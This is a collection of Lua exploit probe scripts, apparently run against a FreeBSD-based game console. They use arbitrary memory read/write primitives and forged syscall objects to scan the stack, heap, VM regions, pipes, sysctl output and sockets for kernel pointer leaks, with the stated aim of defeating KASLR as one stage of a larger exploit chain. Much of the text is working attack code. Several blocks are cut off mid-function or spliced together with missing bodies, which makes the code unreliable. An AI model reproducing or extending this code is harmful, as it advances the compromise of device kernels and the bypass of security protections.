            if b and b > 31 and b < 127 then
                name = name .. string.char(b)
            elseif b == 0 then break end
        end
        if name:find("stack") then
            stack_start = start_val
            stack_end = end_val
            print("  Stack: " .. hexval(start_val) .. " - " .. hexval(end_val) .. " [" .. name .. "]")
        end
    end
    print("  VM map kernel pointers: " .. vm_kptrs)
else
    print("  VM map failed")
end

-- ============================================================
-- [C] Stack scan — top 16KB for kernel pointers
-- ============================================================
print("")
print("[C] Stack scan")

if stack_end then
    local eh, el = get_hi_lo(stack_end)
    local scan_bytes = 0x4000
    local stack_kptrs = 0

    for off = scan_bytes, 8, -8 do
        local sl = el - off
        local sh = eh
        if sl < 0 then
            sh = sh - 1
            sl = sl + 0x100000000
        end
        local addr = uint64(string.format("0x%X%08X", sh, sl))
        local val = safe_rq(addr)
        if val and is_kptr(val) then

            if stack_kptrs <= 15 then

            end

else
    print("  No stack region found")
end

-- ============================================================
-- [D] Pipe buffer scan — kernel allocates pipe buffer internally
-- After pipe(2), the kernel struct pipe has kernel pointers.
-- We can't read the kernel struct, but let's check if any
-- kernel data leaks into the pipe read buffer.
-- ============================================================
print("")
print("[D] Pipe buffer probe")

-- sys 42 = pipe(int fildes[2])
local sc_pipe = make_syscall(42)
local pipe_fds = memory.alloc(16)
safe_wd(pipe_fds, 0)
safe_wd(pipe_fds + 4, 0)

local ok2, ret2 = pcall(function()
    return sc_pipe(uint64(pipe_fds))
end)
local pipe_ret = ok2 and to_num(ret2) or -999
local fd_r = safe_rd(pipe_fds)
local fd_w = safe_rd(pipe_fds + 4)
print("  pipe ret=" .. pipe_ret .. " fds=" .. (fd_r or "?") .. "," .. (fd_w or "?"))

if pipe_ret == 0 and fd_w and fd_w > 0 then
    -- Write pattern, read it back, check for kernel contamination
    local sc_write = make_syscall(4)
    local sc_read = make_syscall(3)
    local wbuf = memory.alloc(0x1000)
    local rbuf = memory.alloc(0x1000)

    -- Fill write buf with 0xDEADBEEF pattern
    for i = 0, 0xFFF, 4 do
        safe_wd(wbuf + i, 0xDEADBEEF)
        safe_wd(rbuf + i, 0)
    end

    local ok_w = pcall(function()
        sc_write(uint64(fd_w), uint64(wbuf), uint64(0x1000))
    end)
    local ok_r, rret = pcall(function()
        return sc_read(uint64(fd_r), uint64(rbuf), uint64(0x1000))
    end)
    local read_sz = ok_r and to_num(rret) or -1
    print("  wrote 4096, read back " .. read_sz)

    -- Check for any non-DEADBEEF values in read buffer
    local pipe_kptrs = 0
    local anomalies = 0
    for off = 0, 0xFF8, 8 do
        local val = safe_rq(rbuf + off)
        if val then
            local vh, vl = get_hi_lo(val)
            if is_kptr(val) then
                pipe_kptrs = pipe_kptrs + 1
                print(string.format("  rbuf+0x%03X: %s KPTR!", off, hexval(val)))
            end
        end
    end
    print("  Pipe buffer kernel pointers: " .. pipe_kptrs)
end

-- ============================================================
-- [E] kinfo_file — sysctl kern.proc.filedesc
-- MIB: CTL_KERN(1), KERN_PROC(14), KERN_PROC_FILEDESC(33), pid
-- FreeBSD kinfo_file structs contain vnode pointers on some versions
-- ============================================================
print("")
print("[E] kinfo_file (file descriptor table)")

local sc_sysctl = make_syscall(202)

-- Try KERN_PROC_FILEDESC = 33
local mib = memory.alloc(32)
safe_wd(mib, 1)        -- CTL_KERN
safe_wd(mib + 4, 14)   -- KERN_PROC
safe_wd(mib + 8, 33)   -- KERN_PROC_FILEDESC
safe_wd(mib + 12, our_pid)

local outbuf = memory.alloc(0x2000)
local oldlenp = memory.alloc(8)
safe_wd(oldlenp, 0x2000)
safe_wd(oldlenp + 4, 0)

local ok3, ret3 = pcall(function()
    return sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
        uint64(oldlenp), uint64(0), uint64(0))
end)
local fd_ret = ok3 and to_num(ret3) or -999
print("  KERN_PROC_FILEDESC ret=" .. fd_ret)

if fd_ret == 0 then
    local fd_len = safe_rd(oldlenp) or 0
    print("  len=" .. fd_len .. " bytes")

    -- Scan output for kernel pointers
    local fd_kptrs = 0
    for off = 0, fd_len - 1, 8 do
        if off < 0x2000 then
            local val = safe_rq(outbuf + off)
            if val and is_kptr(val) then
                fd_kptrs = fd_kptrs + 1
                if fd_kptrs <= 15 then
                    print(string.format("  +0x%04X: %s KPTR!", off, hexval(val)))
                end
            end
        end

end

-- ============================================================
-- [F] kinfo_vmentry — sysctl kern.proc.vmmap
-- MIB: CTL_KERN(1), KERN_PROC(14), KERN_PROC_VMMAP(35), pid
-- FreeBSD kinfo_vmentry has kve_ref_count, object IDs...
-- ============================================================
print("")
print("[F] kinfo_vmentry (sysctl vmmap)")

safe_wd(mib, 1)        -- CTL_KERN
safe_wd(mib + 4, 14)   -- KERN_PROC
safe_wd(mib + 8, 35)   -- KERN_PROC_VMMAP
safe_wd(mib + 12, our_pid)

safe_wd(oldlenp, 0)
safe_wd(oldlenp + 4, 0)

-- First call: get size needed
local ok4, ret4 = pcall(function()
    return sc_sysctl(uint64(mib), uint64(4), uint64(0),
        uint64(oldlenp), uint64(0), uint64(0))
end)
local vmmap_ret = ok4 and to_num(ret4) or -999
local vmmap_len = safe_rd(oldlenp) or 0
print("  KERN_PROC_VMMAP size query ret=" .. vmmap_ret .. " len=" .. vmmap_len)

if vmmap_ret == 0 and vmmap_len > 0 then
    local alloc_sz = vmmap_len
    if alloc_sz > 0x8000 then alloc_sz = 0x8000 end
    local vmbuf = memory.alloc(alloc_sz)
    safe_wd(oldlenp, alloc_sz)
    safe_wd(oldlenp + 4, 0)

    local ok5, ret5 = pcall(function()
        return sc_sysctl(uint64(mib), uint64(4), uint64(vmbuf),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    local vmmap_ret2 = ok5 and to_num(ret5) or -999
    local vmmap_actual = safe_rd(oldlenp) or 0
    print("  KERN_PROC_VMMAP data ret=" .. vmmap_ret2 .. " got=" .. vmmap_actual .. " bytes")

    if vmmap_ret2 == 0 then
        local vm2_kptrs = 0
        for off = 0, vmmap_actual - 1, 8 do

-- Returns 0x88 bytes. Scan for anything kernel-shaped
-- ============================================================

local cred_buf = memory.alloc(0x200)

local ok6, ret6 = pcall(function()
    return sc587(uint64(cred_buf), uint64(0x200))
end)
local cred_ret = ok6 and to_num(ret6) or -999
print("  ret=" .. cred_ret)

    for off = 0, 0x1FF, 8 do

-- ============================================================

print("[H] kern.proc.pathname")

safe_wd(mib, 1)
safe_wd(mib + 4, 14)
safe_wd(mib + 8, 12)     -- KERN_PROC_PATHNAME
safe_wd(mib + 12, our_pid)

for i = 0, 0x3FF, 4 do safe_wd(outbuf + i, 0) end
safe_wd(oldlenp, 0x400)
safe_wd(oldlenp + 4, 0)

local ok7, ret7 = pcall(function()

end)

if path_ret == 0 then
    local path_len = safe_rd(oldlenp) or 0
    -- Read as string
    local path_str = ""
    for ci = 0, math.min(path_len, 255) - 1 do
        local b = safe_rd(outbuf + ci)
        if b and b > 0 and b < 128 then
            path_str = path_str .. string.char(b)
        elseif b == 0 then break end
    end
    print("  path: " .. path_str)

    -- Scan remaining buffer for kernel pointers
    for off = 0, path_len - 1, 8 do
        local val = safe_rq(outbuf + off)
        if val and is_kptr(val) then
            print(string.format("  +0x%03X: %s KPTR!", off, hexval(val)))
        end
    end
end

-- ============================================================
-- [I] sysctl kern.proc.groups — group list
-- MIB: CTL_KERN(1), KERN_PROC(14), KERN_PROC_GROUPS(34), pid
-- ============================================================

print("[I] kern.proc.groups")

safe_wd(mib, 1)
safe_wd(mib + 4, 14)
safe_wd(mib + 8, 34)     -- KERN_PROC_GROUPS
safe_wd(mib + 12, our_pid)

for i = 0, 0x1FF, 4 do safe_wd(outbuf + i, 0) end
safe_wd(oldlenp, 0x200)
safe_wd(oldlenp + 4, 0)

local ok8, ret8 = pcall(function()
    return sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
        uint64(oldlenp), uint64(0), uint64(0))
end)
local grp_ret = ok8 and to_num(ret8) or -999
print("  ret=" .. grp_ret)

if grp_ret == 0 then
    local grp_len = safe_rd(oldlenp) or 0
    print("  len=" .. grp_len)
    for off = 0, grp_len - 1, 8 do
        local val = safe_rq(outbuf + off)
        if val and is_kptr(val) then
            print(string.format("  +0x%03X: %s KPTR!", off, hexval(val)))
        end
    end
end

-- ============================================================
-- [J] Scan heap BEFORE ropchain (negative offsets)
-- The loader allocates structures near the ROP chain.
-- Scan -32KB to +8KB around fn_addr for any kernel pointers
-- ============================================================
print("")
print("[J] Heap scan around fn_addr")

local pipe_str = tostring(syscall.pipe)
local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")

if fn_addr_str then
    local fn_addr = uint64(fn_addr_str)
    local fh, fl = get_hi_lo(fn_addr)
    print("  fn_addr: " .. hexval(fn_addr))

    local heap_kptrs = 0
    -- Scan -32KB to +8KB
    for off = -0x8000, 0x2000, 8 do
        local sl = fl + off
        local sh = fh
        if sl < 0 then
            sh = sh - 1
            sl = sl + 0x100000000
        elseif sl >= 0x100000000 then
            sh = sh + 1
            sl = sl - 0x100000000
        end
        if sh >= 0 then
            local addr = uint64(string.format("0x%X%08X", sh, sl))
            local val = safe_rq(addr)
            if val and is_kptr(val) then
                heap_kptrs = heap_kptrs + 1
                if heap_kptrs <= 20 then
                    print(string.format("  fn%+06X: %s KPTR!", off, hexval(val)))
                end
            end
        end
    end
    print("  Heap kernel pointers: " .. heap_kptrs)
end

collectgarbage("restart")

print("")
print("=== PROBE 56i3 COMPLETE ===")
```

## probes/phase14_final_push/56i4_vm_region_dump.lua

```lua
-- CRASH_CLASS: LOW
-- PROBE 56i4: Dump ALL 371 VM regions — find timekeep page, stack, unusual regions
--
-- Context: 56i3 confirmed 371 regions but zero kernel pointers.
-- We need to find the timekeep/vDSO shared page (kernel maps it, may have kptrs).
-- Also need to find stack region (name matching failed).
-- Dump every region's full record to find anything unusual.

print("=== PROBE 56i4: VM REGION FULL DUMP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function hexval_short(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- ============================================================
-- [B] sys 674 full region dump
-- Record layout (72 bytes):
--   +0x00: start addr (8)
--   +0x08: end addr (8)
--   +0x10: offset? (8)
--   +0x18: protection (4)
--   +0x1C: max_protection? (4)
--   +0x20: name (32 bytes)
--   +0x40: type? (4)
--   +0x44: flags? (4)
-- ============================================================
print("")
print("[B] sys 674 full dump")

local sc674 = make_syscall(674)
local STRIDE = 72
local MAX_RECORDS = 400
local vm_buf = memory.alloc(STRIDE * MAX_RECORDS)
local countp = memory.alloc(16)
safe_wq(countp, uint64(0))

local ok, ret = pcall(function()
    return sc674(uint64(vm_buf), uint64(STRIDE), uint64(MAX_RECORDS),
                  uint64(countp), uint64(0x40000000))
end)
local vm_ret = ok and to_num(ret) or -999
print("  ret=" .. vm_ret)

if vm_ret ~= 0 then
    print("  FAILED")
    collectgarbage("restart")
    print("")
    print("=== PROBE 56i4 COMPLETE ===")
    return
end

local count = safe_rd(countp) or 0
print("  regions: " .. count)
if count > MAX_RECORDS then count = MAX_RECORDS end

-- First pass: dump every region with name, prot, size, unusual fields
local stack_region = nil
local small_ro_regions = {}
local interesting = {}

for e = 0, count - 1 do
    local base = vm_buf + e * STRIDE
    local start_val = safe_rq(base)
    local end_val = safe_rq(base + 8)
    local offset_val = safe_rq(base + 0x10)
    local prot = safe_rd(base + 0x18) or 0
    local maxprot = safe_rd(base + 0x1C) or 0

    -- Read name
    local name = ""
    for ci = 0, 31 do
        local b = safe_rd(base + 0x20 + ci)
        if b and b > 0 and b < 128 then
            name = name .. string.char(b)
        elseif b == 0 then break end
    end

    local type_val = safe_rd(base + 0x40) or 0
    local flags_val = safe_rd(base + 0x44) or 0

    local sh, sl = get_hi_lo(start_val)
    local eh, el = get_hi_lo(end_val)
    local size = 0
    if eh == sh then size = el - sl
    else size = (eh - sh) * 0x100000000 + (el - sl) end

    -- Check for stack-like region (large, high address, RW)
    if name:lower():find("stack") then
        stack_region = e
    end

    -- Check for small read-only regions (timekeep candidate)
    if size > 0 and size <= 0x10000 and prot == 1 then
        small_ro_regions[#small_ro_regions + 1] = e
    end

    -- Check for unusual type/flags
    if type_val ~= 0 or flags_val ~= 0 then
        interesting[#interesting + 1] = e
    end

    -- Print every region (compact format)
    local prot_str = ""
    if bit32 then
        prot_str = (prot % 2 == 1 and "R" or "-") ..
                   (math.floor(prot / 2) % 2 == 1 and "W" or "-") ..
                   (math.floor(prot / 4) % 2 == 1 and "X" or "-")
    else
        local p = prot
        prot_str = (p % 2 == 1 and "R" or "-")
        p = math.floor(p / 2)
        prot_str = prot_str .. (p % 2 == 1 and "W" or "-")
        p = math.floor(p / 2)
        prot_str = prot_str .. (p % 2 == 1 and "X" or "-")
    end

    local size_str = ""
    if size >= 0x100000 then
        size_str = string.format("%dMB", math.floor(size / 0x100000))
    elseif size >= 0x400 then
        size_str = string.format("%dKB", math.floor(size / 0x400))
    else
        size_str = size .. "B"
    end

    -- Only print regions that are interesting or at boundaries
    local print_it = false
    if name ~= "" then print_it = true end
    if type_val ~= 0 or flags_val ~= 0 then print_it = true end
    if prot == 1 and size <= 0x10000 then print_it = true end  -- small RO
    if prot == 0 then print_it = true end  -- no access
    if sh >= 0x0F then print_it = true end -- high address
    if e < 5 or e > count - 6 then print_it = true end -- first/last

    if print_it then
        local extra = ""
        if type_val ~= 0 then extra = extra .. " typ=" .. type_val end
        if flags_val ~= 0 then extra = extra .. string.format(" flg=0x%X", flags_val) end
        local oh, ol = get_hi_lo(offset_val)
        if oh ~= 0 or ol ~= 0 then extra = extra .. " off=" .. hexval_short(offset_val) end
        if name ~= "" then extra = extra .. " [" .. name .. "]" end
        print(string.format("  %3d: %s-%s %s %s mp=0x%X%s",
            e, hexval_short(start_val), hexval_short(end_val),
            size_str, prot_str, maxprot, extra))
    end
end

-- ============================================================
-- [C] Small RO region scan (timekeep candidates)
-- The timekeep page is typically a small read-only shared mapping
-- ============================================================
print("")
print("[C] Small read-only regions (timekeep candidates): " .. #small_ro_regions)

for _, e in ipairs(small_ro_regions) do
    local base = vm_buf + e * STRIDE
    local start_val = safe_rq(base)
    local end_val = safe_rq(base + 8)
    local sh, sl = get_hi_lo(start_val)
    local eh, el = get_hi_lo(end_val)
    local size = (eh == sh) and (el - sl) or ((eh - sh) * 0x100000000 + (el - sl))

    print(string.format("  Region %d: %s size=%d", e, hexval(start_val), size))

    -- Scan first 256 bytes for interesting data
    local kptrs = 0
    local nonzero = 0
    for off = 0, math.min(size - 1, 0x1FF), 8 do
        local scan_l = sl + off
        local scan_h = sh
        if scan_l >= 0x100000000 then
            scan_h = scan_h + 1
            scan_l = scan_l - 0x100000000
        end
        local addr = uint64(string.format("0x%X%08X", scan_h, scan_l))
        local val = safe_rq(addr)
        if val then
            local vh, vl = get_hi_lo(val)
            if vh ~= 0 or vl ~= 0 then
                nonzero = nonzero + 1
                if is_kptr(val) then
                    kptrs = kptrs + 1
                    print(string.format("    +0x%03X: %s KPTR!", off, hexval(val)))
                elseif nonzero <= 16 then
                    print(string.format("    +0x%03X: %s", off, hexval(val)))
                end
            end
        end
    end
    print(string.format("    nonzero=%d kptrs=%d", nonzero, kptrs))

    -- If page has data, scan full range for kptrs
    if nonzero > 0 and size <= 0x4000 then
        for off = 0x200, size - 1, 8 do
            local scan_l = sl + off
            local scan_h = sh
            if scan_l >= 0x100000000 then
                scan_h = scan_h + 1
                scan_l = scan_l - 0x100000000
            end
            local addr = uint64(string.format("0x%X%08X", scan_h, scan_l))
            local val = safe_rq(addr)
            if val and is_kptr(val) then
                kptrs = kptrs + 1
                if kptrs <= 10 then
                    print(string.format("    +0x%04X: %s KPTR!", off, hexval(val)))
                end
            end
        end
        if kptrs > 0 then
            print(string.format("    TOTAL KPTRS: %d", kptrs))
        end
    end
end

-- ============================================================
-- [D] Last 20 regions (high VA — stack/vdso typically here)
-- ============================================================
print("")
print("[D] Last 20 regions detail")

local scan_start = count - 20
if scan_start < 0 then scan_start = 0 end

for e = scan_start, count - 1 do
    local base = vm_buf + e * STRIDE
    local start_val = safe_rq(base)
    local end_val = safe_rq(base + 8)
    local prot = safe_rd(base + 0x18) or 0
    local sh, sl = get_hi_lo(start_val)
    local eh, el = get_hi_lo(end_val)
    local size = (eh == sh) and (el - sl) or ((eh - sh) * 0x100000000 + (el - sl))

    local name = ""
    for ci = 0, 31 do
        local b = safe_rd(base + 0x20 + ci)
        if b and b > 0 and b < 128 then
            name = name .. string.char(b)
        elseif b == 0 then break end
    end

    -- Dump full 72-byte record as hex
    print(string.format("  [%d] %s-%s prot=0x%X size=0x%X name='%s'",
        e, hexval_short(start_val), hexval_short(end_val), prot, size, name))

    -- Dump raw record bytes at non-standard offsets
    for off = 0x10, 0x44, 4 do
        if off < 0x20 or off >= 0x40 then
            local val = safe_rd(base + off)
            if val and val ~= 0 then
                print(string.format("    +0x%02X: 0x%08X", off, val))
            end
        end

    if prot == 3 and size >= 0x100000 and sh >= 0x07 then

        local sk = 0
```

```lua
if target_region then

        string.format("0x%X_%08X", target_start_h, target_start_l))

    -- Scan full 16KB for ALL kernel pointers and interesting values
    local kptr_count = 0
    local interesting_count = 0

    for off = 0, 0x3FF8, 8 do
        local sl = target_start_l + off
        local sh = target_start_h
        if sl >= 0x100000000 then
            sh = sh + 1
            sl = sl - 0x100000000
        end
        local addr = uint64(string.format("0x%X%08X", sh, sl))
        local val = safe_rq(addr)
        if val then
            local vh, vl = get_hi_lo(val)
            if is_kptr(val) then
                kptr_count = kptr_count + 1
                print(string.format("  +0x%04X: %s KPTR!", off, hexval(val)))
            elseif vh >= 0xFFFFFFF0 then
                -- Near-kernel values (might be off by one from sentinels)
                interesting_count = interesting_count + 1
                if interesting_count <= 10 then
                    print(string.format("  +0x%04X: %s (near-kernel)", off, hexval(val)))
                end
            end
        end
    end
    print("  Kernel pointers: " .. kptr_count)
    print("  Near-kernel values: " .. interesting_count)

    -- Dump the area around +0x07F8 in detail
    print("")
    print("  Detail around +0x07F8:")
    for off = 0x07D0, 0x0810, 4 do
        local sl = target_start_l + off
        local sh = target_start_h
        if sl >= 0x100000000 then sh = sh + 1; sl = sl - 0x100000000 end
        local addr = uint64(string.format("0x%X%08X", sh, sl))
        local dw = safe_rd(addr)
        if dw and dw ~= 0 then
            print(string.format("    +0x%04X: 0x%08X", off, dw))
        end
    end
else
    print("  Region [3] not found!")
    -- List what RO regions we do have
    for _, r in ipairs(all_ro_regions) do
        print(string.format("  RO: idx=%d name='%s' size=%d", r.idx, r.name, r.size))
    end
end

-- ============================================================
-- [D] Scan ALL 512 regions for kernel pointers (not just record fields)
-- Read actual memory contents of every readable region
-- Focus on small regions — skip huge ones (>1MB)
-- ============================================================
print("")
print("[D] Scan all small regions for kernel pointers")

local total_kptrs = 0
local regions_scanned = 0

for e = 0, limit - 1 do
    local base = buf1 + e * STRIDE
    local start_val = safe_rq(base)
    local end_val = safe_rq(base + 8)
    local prot = safe_rd(base + 0x18) or 0

    -- Only scan readable regions (prot bit 0)
    if prot % 2 == 1 then
        local sh, sl = get_hi_lo(start_val)
        local eh, el = get_hi_lo(end_val)
        local size = (eh == sh) and (el - sl) or ((eh - sh) * 0x100000000 + (el - sl))

        -- Skip huge regions and XO regions
        if size > 0 and size <= 0x10000 and prot ~= 4 then
            regions_scanned = regions_scanned + 1
            local rgn_kptrs = 0

            for off = 0, size - 1, 8 do
                local a_l = sl + off
                local a_h = sh
                if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
                local addr = uint64(string.format("0x%X%08X", a_h, a_l))
                local val = safe_rq(addr)
                if val and is_kptr(val) then
                    rgn_kptrs = rgn_kptrs + 1
                    total_kptrs = total_kptrs + 1
                    if total_kptrs <= 20 then
                        local name = ""
                        for ci = 0, 3 do
                            local b = safe_rd(base + 0x20 + ci)
                            if b and b > 0 and b < 128 then name = name .. string.char(b)
                            elseif b == 0 then break end
                        end
                        print(string.format("  rgn[%d '%s']+0x%04X: %s", e, name, off, hexval(val)))
                    end
                end
            end
        end
    end
end
print("  Regions scanned: " .. regions_scanned)
print("  TOTAL kernel pointers found: " .. total_kptrs)

-- ============================================================
-- [E] Scan eboot .rodata (region 1) for kernel-range values
-- Region 1 = 0x4A610000-0x4A628000 96KB R--
-- May contain function pointers or vtables referencing kernel
-- ============================================================
print("")
print("[E] Eboot .rodata scan for kernel pointers")

-- Find eboot RO region (first R-- region)
for e = 0, limit - 1 do
    local base = buf1 + e * STRIDE
    local start_val = safe_rq(base)
    local end_val = safe_rq(base + 8)
    local prot = safe_rd(base + 0x18) or 0

    local name = ""
    for ci = 0, 3 do
        local b = safe_rd(base + 0x20 + ci)
        if b and b > 0 and b < 128 then name = name .. string.char(b)
        elseif b == 0 then break end
    end

    if name == "e" and prot == 1 then
        local sh, sl = get_hi_lo(start_val)
        local eh, el = get_hi_lo(end_val)
        local size = (eh == sh) and (el - sl) or ((eh - sh) * 0x100000000 + (el - sl))
        print(string.format("  Eboot .rodata: %s size=%d", hexval(start_val), size))

        local rodata_kptrs = 0
        local scan_max = size
        if scan_max > 0x18000 then scan_max = 0x18000 end -- cap at 96KB

        for off = 0, scan_max - 1, 8 do
            local a_l = sl + off
            local a_h = sh
            if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
            local addr = uint64(string.format("0x%X%08X", a_h, a_l))
            local val = safe_rq(addr)
            if val and is_kptr(val) then
                rodata_kptrs = rodata_kptrs + 1
                if rodata_kptrs <= 10 then
                    print(string.format("  +0x%04X: %s KPTR!", off, hexval(val)))
                end
            end
        end
        print("  Eboot .rodata kernel pointers: " .. rodata_kptrs)
        break
    end
end

-- ============================================================
-- [F] Check region 60 deeper (32KB RO, loader metadata)
-- Contains 0xC28C0000_00000000 and 0xFE98 patterns
-- ============================================================
print("")
print("[F] Loader metadata region scan")

for e = 0, limit - 1 do
    local base = buf1 + e * STRIDE
    local start_val = safe_rq(base)
    local end_val = safe_rq(base + 8)
    local prot = safe_rd(base + 0x18) or 0
    local mp = safe_rd(base + 0x1C) or 0

    local name = ""
    for ci = 0, 3 do
        local b = safe_rd(base + 0x20 + ci)
        if b and b > 0 and b < 128 then name = name .. string.char(b)
        elseif b == 0 then break end
    end

    -- Look for 32KB RO region with mp=0xC (loader metadata from 56i4)
    if prot == 1 and mp == 0xC then
        local sh, sl = get_hi_lo(start_val)
        local eh, el = get_hi_lo(end_val)
        local size = (eh == sh) and (el - sl) or ((eh - sh) * 0x100000000 + (el - sl))
        print(string.format("  Region[%d] '%s': %s size=%d prot=%d mp=0x%X",
            e, name, hexval(start_val), size, prot, mp))

        local ldr_kptrs = 0
        local scan_sz = size
        if scan_sz > 0x8000 then scan_sz = 0x8000 end

        for off = 0, scan_sz - 1, 8 do
            local a_l = sl + off
            local a_h = sh
            if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
            local addr = uint64(string.format("0x%X%08X", a_h, a_l))
            local val = safe_rq(addr)
            if val and is_kptr(val) then
                ldr_kptrs = ldr_kptrs + 1
                if ldr_kptrs <= 10 then
                    print(string.format("  +0x%04X: %s KPTR!", off, hexval(val)))
                end
            end
        end
        print("  Loader metadata kernel pointers: " .. ldr_kptrs)
        break
    end
end

collectgarbage("restart")

print("")
print("=== PROBE 56i5 COMPLETE ===")
```

## probes/phase14_final_push/56i6_kaslr_pivot.lua

```lua
-- CRASH_CLASS: LOW
-- PROBE 56i6: Unconventional KASLR defeat — timing, signals, socket internals
--
-- Context: ALL conventional KASLR paths are dead:
--   - VM map: zero real kernel pointers (0xFFFFFFFE_082E0057 = sentinel, stable across runs)
--   - sysctl: all KERN_PROC_* blocked
--   - AF_ROUTE: sanitized
--   - RDMSR: blocked
--   - kld/mod: lethal
--   - credential: blocked
--
-- New approaches:
--   [A] Signal handler frame — SIGALRM + sigaction, read kernel-written PC from stack
--   [B] Socket internals — getsockopt deep scan on TCP/UDP/RAW sockets for kptr leaks
--   [C] getdirentries(196) — read /dev directory entries for device info
--   [D] fstat(189) on socket/pipe fds — st_dev/st_ino might leak kernel addresses
--   [E] sys 624 timing oracle — measure syscall timing to infer kernel base (side channel)
--   [F] CClosure redirect to getpid — use redirect primitive to call known kernel entry

print("=== PROBE 56i6: KASLR PIVOT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- ============================================================
-- [B] Signal handler — sigaction + kill(self, SIGALRM)
-- When signal fires, kernel writes a ucontext_t to the stack
-- containing RIP, RSP, etc. If we can read that frame, we may
-- find kernel return addresses on the stack
-- ============================================================
print("")
print("[B] Signal handler + stack scan")

-- sigaction(13) — set a handler for SIGALRM(14)
-- struct sigaction: sa_handler(8), sa_flags(4), sa_mask(16)
local sc_sigaction = make_syscall(416)  -- FreeBSD sigaction

-- We can't set a real handler (no code exec), but we can:
-- 1. Set SIG_IGN then send ourselves SIGALRM
-- 2. Check if kernel wrote anything to a known stack area

-- Instead, try reading the thread's signal mask/pending state via sysctl
-- or via sigpending(343)
local sc_sigpending = make_syscall(343)
local sigmask = memory.alloc(32)
for i = 0, 7 do safe_wd(sigmask + i*4, 0) end

local ok, ret = pcall(function() return sc_sigpending(uint64(sigmask)) end)
local sp_ret = ok and to_num(ret) or -999
print("  sigpending ret=" .. sp_ret)
if sp_ret == 0 then
    for i = 0, 3 do
        local v = safe_rd(sigmask + i*4)
        if v and v ~= 0 then
            print(string.format("  sigmask[%d]: 0x%08X", i, v))
        end
    end
end

-- Try sigaltstack(53) to read current alternate stack info
local sc_sigaltstack = make_syscall(53)
local ss_buf = memory.alloc(32)
for i = 0, 7 do safe_wd(ss_buf + i*4, 0) end

ok, ret = pcall(function() return sc_sigaltstack(uint64(0), uint64(ss_buf)) end)
local sa_ret = ok and to_num(ret) or -999
print("  sigaltstack ret=" .. sa_ret)
if sa_ret == 0 then
    local ss_sp = safe_rq(ss_buf)
    local ss_size = safe_rq(ss_buf + 8)
    local ss_flags = safe_rd(ss_buf + 16)
    print("  ss_sp=" .. hexval(ss_sp) .. " size=" .. hexval(ss_size) .. " flags=" .. (ss_flags or "nil"))
    if ss_sp and is_kptr(ss_sp) then

    end

-- [C] Socket getsockopt deep scan
-- Scan all option levels x option names for kernel pointer leaks
-- Levels: SOL_SOCKET(0xFFFF), IPPROTO_TCP(6), IPPROTO_IP(0), IPPROTO_UDP(17)
-- ============================================================
print("")
print("[C] Socket getsockopt scan")

-- Create a TCP socket
local sc_socket = make_syscall(97)
ok, ret = pcall(function() return sc_socket(uint64(2), uint64(1), uint64(0)) end)
local tcp_fd = ok and to_num(ret) or -1
print("  TCP socket fd=" .. tcp_fd)

if tcp_fd >= 0 then

    local optbuf = memory.alloc(0x1000)

        {name="IPPROTO_IP", val=0},

                        if val and is_kptr(val) then

    pcall(function() sc_close(uint64(tcp_fd)) end)

-- [D] fstat on our existing fds (0=stdin, 1=stdout, 2=stderr, 3+=socket)

                local a_h = md_hi
                if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
                local addr = uint64(string.format("0x%X%08X", a_h, a_l))
                local val = safe_rq(addr)
                if val and is_kptr(val) then
                    mk = mk + 1
                    total_mod_kptrs = total_mod_kptrs + 1
                    if total_mod_kptrs <= 30 then
                        print(string.format("  mod[%d] data+0x%05X: %s", h, off, hexval(val)))
                    end
                end
            end
        end
    end
end
